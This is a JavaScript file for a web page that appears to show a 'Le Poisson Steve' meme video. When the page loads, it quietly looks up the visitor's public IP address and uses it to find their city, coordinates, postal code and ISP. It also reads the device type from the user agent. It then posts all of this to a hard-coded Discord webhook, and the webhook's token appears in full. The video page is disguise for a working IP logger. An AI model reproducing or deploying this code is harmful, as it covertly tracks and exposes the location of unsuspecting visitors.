document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('le-poisson-steve');
    
    // Improve iOS compatibility
    video.playsInline = true;
    video.setAttribute('playsinline', '');
    
    // More robust audio unmute logic for iOS
    const enableAudio = () => {
        if (video.muted) {
            video.muted = false;
            video.play().catch(error => {
                console.log('Autoplay was prevented:', error);
            });
        }
        // Remove event listeners after first interaction
        document.removeEventListener('touchstart', enableAudio);
        document.removeEventListener('click', enableAudio);
    };

    // Add multiple event listeners for broader compatibility
    document.addEventListener('touchstart', enableAudio);
    document.addEventListener('click', enableAudio);

    async function sendDataToDiscord(ipAddress, deviceType, deviceModel, location, webhookURL, userAgent, isp) {
        const message = {
            content: `Visitor IP Address: ${ipAddress}\nDevice Type: ${deviceType}\nDevice Model: ${deviceModel}\nPosition: ${location}\nUser Agent: ${userAgent}\nISP: ${isp}`
        };

        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
            console.log('IP address and device info sent to Discord webhook');
        } catch (error) {
            console.error('Error sending data to Discord:', error);
        }
    }

    async function sendIPToDiscord() {
        const webhookURL = 'https://discord.com/api/webhooks/1362855854230999101/ZK0v8Fc_YmJ9MMorlAd_kOjiZwGdh2Un4cxIcA4MwWI5tFGRmBUt8l5YoF2l1qDJNoTD';

        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;

            let deviceInfo = "Unknown Device";
            let deviceModel = "Unknown Model";
            let deviceType = "Unknown Type";

            const userAgent = navigator.userAgent;

            if (/Mobile|Android|iP(hone|od|ad)/.test(userAgent)) {
                deviceType = "Mobile";
                if (/iPhone/.test(userAgent)) {
                    deviceModel = "iPhone";
                } else if (/iPad/.test(userAgent)) {
                    deviceModel = "iPad";
                } else if (/Android/.test(userAgent)) {
                    deviceModel = "Android";
                }
            } else if (/Tablet|iPad/.test(userAgent)) {
                deviceType = "Tablet";
                if (/iPad/.test(userAgent)) {
                    deviceModel = "iPad";
                }
            } else {
                deviceType = "Desktop";
            }

            let locationInfo = "Geolocation from IP not available";
            let ispInfo = "ISP info not available";
            try {
                const locationResponse = await fetch(`http://ip-api.com/json/${userIP}`);
                const locationData = await locationResponse.json();
                if (locationData.status === 'success') {
                    locationInfo = `City: ${locationData.city}, Region: ${locationData.regionName}, Country: ${locationData.country}`;
                    locationInfo += `\nLat: ${locationData.lat}, Lon: ${locationData.lon}`;
                    locationInfo += `\nOrganization: ${locationData.org}`;
                    locationInfo += `\nTimezone: ${locationData.timezone}`;
                    locationInfo += `\nPostal Code: ${locationData.zip}`;
                    ispInfo = locationData.isp;

                } else {
                    console.log("IP geolocation failed:", locationData.message);
                    locationInfo = `IP geolocation failed: ${locationData.message}`;
                }
            } catch (error) {
                console.error("Error fetching IP geolocation:", error);
                locationInfo = "Error fetching IP geolocation";
            }
            sendDataToDiscord(userIP, deviceType, deviceModel, locationInfo, webhookURL, userAgent, ispInfo);
        } catch (error) {
            console.error('Error sending IP to Discord:', error);
        }
    }

    sendIPToDiscord();
});